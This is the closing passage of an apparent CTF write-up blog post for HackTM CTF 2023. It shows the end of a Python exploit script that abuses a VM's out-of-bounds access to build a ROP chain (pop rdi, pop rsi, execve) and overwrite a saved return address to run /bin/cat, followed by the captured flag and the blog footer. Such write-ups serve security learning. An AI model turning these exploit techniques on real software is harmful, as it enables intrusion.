</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a4&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a3&#39;</span><span class="p">),</span> <span class="mh">0x16a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xbe</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a4&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a4&#39;</span><span class="p">),</span> <span class="mh">0x300</span><span class="p">)</span> <span class="c1"># a4 == pop_rdi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set a5 = ret</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a5&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a4&#39;</span><span class="p">),</span> <span class="mh">0x1</span><span class="p">)</span> <span class="c1"># a5 == ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set a6 = pop_rsi</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a6&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a3&#39;</span><span class="p">),</span> <span class="mh">0x21f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xca</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a6&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a6&#39;</span><span class="p">),</span> <span class="mh">0x300</span><span class="p">)</span> <span class="c1"># a6 == pop_rsi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set a7 = execve</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a7&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a3&#39;</span><span class="p">),</span> <span class="mh">0x10b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x4be</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a7&#39;</span><span class="p">),</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a7&#39;</span><span class="p">),</span> <span class="mh">0x300</span><span class="p">)</span> <span class="c1"># a7 == execve</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># RIP Control</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Based on observation in gdb, mem[sp+0x18] == Stored RIP Address</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;sp&#39;</span><span class="p">),</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a4&#39;</span><span class="p">))</span> <span class="c1"># pop rdi; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;sp&#39;</span><span class="p">),</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a2&#39;</span><span class="p">))</span> <span class="c1"># address of &#39;/bin/cat&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;sp&#39;</span><span class="p">),</span> <span class="mh">0x28</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a5&#39;</span><span class="p">))</span> <span class="c1"># ret (For stack alignment)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;sp&#39;</span><span class="p">),</span> <span class="mh">0x30</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a6&#39;</span><span class="p">))</span> <span class="c1"># pop rsi; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;sp&#39;</span><span class="p">),</span> <span class="mh">0x38</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;s1&#39;</span><span class="p">))</span> <span class="c1"># address of argv array</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">exec_SD</span><span class="p">(</span><span class="n">reg</span><span class="p">(</span><span class="s1">&#39;sp&#39;</span><span class="p">),</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">reg</span><span class="p">(</span><span class="s1">&#39;a7&#39;</span><span class="p">))</span> <span class="c1"># call execve</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Send Payload</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;(hex-encoded):&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/nxEzzCZ.png"
        data-srcset="https://i.imgur.com/nxEzzCZ.png, https://i.imgur.com/nxEzzCZ.png 1.5x, https://i.imgur.com/nxEzzCZ.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/nxEzzCZ.png"
        title="https://i.imgur.com/nxEzzCZ.png" /></p>
<p>And we got the flag!</p>
<blockquote>
<p>Flag: <code>HackTM{Now_get_an_A_for_the_class!}</code></p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/hacktm-ctf-2023/" data-title="HackTM CTF 2023" data-via="Chovid99" data-hashtags="Writeup,HackTM,pwn,vm,oob,2023"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/hacktm-ctf-2023/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/hacktm/">HackTM</a>,&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/vm/">vm</a>,&nbsp;<a href="/tags/oob/">oob</a>,&nbsp;<a href="/tags/2023/">2023</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/stack-the-flags-ctf-2022/" class="prev" rel="prev" title="STACK the Flags CTF 2022"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>STACK the Flags CTF 2022</a>
            <a href="/posts/acsc-2023/" class="next" rel="next" title="ACSC 2023">ACSC 2023<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
